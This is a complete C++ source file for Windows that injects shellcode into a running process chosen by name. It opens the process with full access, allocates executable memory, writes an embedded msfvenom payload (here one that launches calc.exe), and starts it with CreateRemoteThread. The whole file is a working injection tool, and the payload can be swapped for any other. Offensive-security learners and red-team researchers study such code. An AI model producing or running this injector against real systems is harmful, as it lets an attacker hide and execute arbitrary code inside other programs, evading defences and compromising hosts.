#include <Windows.h>
#include <TlHelp32.h>
#include <string>

void injectIntoProcessAndExecute(DWORD pid, const unsigned char* buffer, SIZE_T bufferSize) {
	printf("[+] Opening handle to remote process with pid: %d\n", pid);
	DWORD procAccess = 0x001F0FFF;
	HANDLE hRemoteProcess = OpenProcess(procAccess, false, pid);
	if (hRemoteProcess == NULL) {
		printf("[!] Couldn't open handle to remote process\n");
		return;
	}
	printf("[+] Obtained handle: %p for PID: %d\n", hRemoteProcess, pid);

	printf("[+] Allocating memory in remote process with pid: %d\n", pid);
	DWORD allocMemSize = 0x1000;
	LPVOID allocMemAddr = VirtualAllocEx(hRemoteProcess, NULL, allocMemSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (allocMemAddr == NULL) {
		printf("[!] Couldn't allocate memory in remote process\n");
		return;
	}
	printf("[+] Allocated memory in remote process with PID: %d at: 0x%p\n", pid, allocMemAddr);

	SIZE_T writtenBytes;
	if (!WriteProcessMemory(hRemoteProcess, allocMemAddr, buffer, bufferSize, &writtenBytes)) {
		printf("[!] Couldn't write bytes to allocated memory in remote process\n");
		return;
	}
	printf("[+] Written %lld bytes at: 0x%p\n", writtenBytes, allocMemAddr);
	
	printf("[+] Creating remote thread in PID: %d\n", pid);
	HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)allocMemAddr, NULL, NULL, NULL);
	if (hRemoteThread == NULL) {
		printf("[!] Couldn't create remote thread\n");
		return;
	}
	printf("[+] Created remote thread, handle: %p\n", hRemoteThread);

	printf("[+] Cleaning up...\n");
	CloseHandle(hRemoteThread);
	CloseHandle(hRemoteProcess);
}

int main(int argc, char** argv) {

	if (argc != 2) {
		printf("[i] Usage: appName.exe <processName>\n");
	}

	// Generated with: msfvenom -p windows/x64/exec CMD="calc.exe" -f c
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	printf("[+] Creating process snapshot\n");
	HANDLE procSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (procSnapshot == NULL) {
		printf("[!] Couldn't create proc snapshot\n");
		return 1;
	}
	printf("[+] Process snapshot handle: %p\n", procSnapshot);
	
	PROCESSENTRY32W proc;
	proc.dwSize = sizeof(proc);

	if (!Process32FirstW(procSnapshot, &proc)) {
		printf("[!] Couldn't obtain first process, aborting...\n");
		return 1;
	}

	LPWSTR* argList = CommandLineToArgvW(GetCommandLineW(), &argc);
	std::wstring lookupProcName = argList[1];

	do {
		if (proc.szExeFile == lookupProcName) {
			injectIntoProcessAndExecute(proc.th32ProcessID, buf, sizeof(buf));
			printf("[+] Done");
			return 0;
		}
	} while (Process32NextW(procSnapshot, &proc));

	printf("[!] Couldn't find process to inject the code to, leaving with no action\n");
	return 0;
}